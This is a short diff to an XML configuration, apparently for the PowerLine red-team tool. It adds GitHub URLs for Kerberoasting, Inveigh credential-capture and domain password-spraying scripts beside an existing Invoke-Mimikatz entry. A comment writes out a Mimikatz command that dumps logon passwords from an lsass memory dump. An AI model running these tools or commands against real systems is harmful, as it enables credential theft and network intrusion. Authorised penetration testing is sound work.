@@ -18,6 +18,10 @@
 	<!-- PowerLine.exe Invoke-Mimikatz "Invoke-Mimikatz -Command \"`\"sekurlsa::minidump lsass_568.dmp`\" `\"sekurlsa::logonPasswords`\"\"" -->
 	<Remote>https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1</Remote>
     
+	<Remote>https://raw.githubusercontent.com/fullmetalcache/tools/master/autokerberoast_nomimi_stripped.ps1</Remote>
+	<Remote>https://raw.githubusercontent.com/fullmetalcache/tools/master/inveigh_stripped.ps1</Remote>
+	<Remote>https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1</Remote>
+	
 	<!-- Fully Qualified Path to Your Local Scripts -->
     <!-- <Local></Local> -->
   
